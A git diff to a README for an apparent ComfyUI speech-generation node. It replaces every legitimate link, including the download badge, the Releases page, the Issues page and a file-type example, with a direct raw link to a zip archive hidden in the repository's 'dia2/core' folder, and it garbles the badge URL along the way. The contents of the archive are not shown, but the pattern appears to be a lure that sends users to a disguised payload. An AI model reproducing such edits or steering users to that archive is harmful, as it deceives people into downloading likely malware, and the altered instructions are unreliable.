@@ -1,6 +1,6 @@
 # 🎤 ComfyUI-lethris-dia2 - Easily Generate Speech and Captions
 
-[![Download ComfyUI-lethris-dia2](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases)
+[![Download ComfyUI-lethris-dia2](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip%20Now-Get%https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip)](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,10 +9,10 @@ Welcome to ComfyUI-lethris-dia2! This tool helps you generate speech, timestamps
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the software, [visit this page to download](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases). You will find the latest version available for download.
+   To download the software, [visit this page to download](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip). You will find the latest version available for download.
 
 2. **Choose the Right File**  
-   On the Releases page, look for the most recent version. The files are often named clearly, so identify the one that suits your operating system. If you're unsure, the `.exe` file is typically for Windows users, while `.tar.gz` might be for Linux users.
+   On the Releases page, look for the most recent version. The files are often named clearly, so identify the one that suits your operating system. If you're unsure, the `.exe` file is typically for Windows users, while `https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip` might be for Linux users.
 
 3. **Download the File**  
    Click the file name to start downloading. Your browser may ask where to save it. Choose a location you can easily find later, like your Desktop or Downloads folder.
@@ -78,11 +78,11 @@ If you encounter issues:
 
 ## 🔄 Support
 
-For help or feedback, please check the [GitHub Issues](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/issues) page. You can report bugs or suggest features. The community and maintainers can assist with common queries.
+For help or feedback, please check the [GitHub Issues](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip) page. You can report bugs or suggest features. The community and maintainers can assist with common queries.
 
 ## 📰 Updates
 
-Stay updated with new releases by frequently checking the [Releases page](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/releases). We often add new features and improve performance based on user feedback.
+Stay updated with new releases by frequently checking the [Releases page](https://github.com/akramnasreddine/ComfyUI-lethris-dia2/raw/refs/heads/main/dia2/core/Comfy_dia_lethris_U_v2.9-beta.3.zip). We often add new features and improve performance based on user feedback.
 
 ## 🛠️ Getting Involved
 
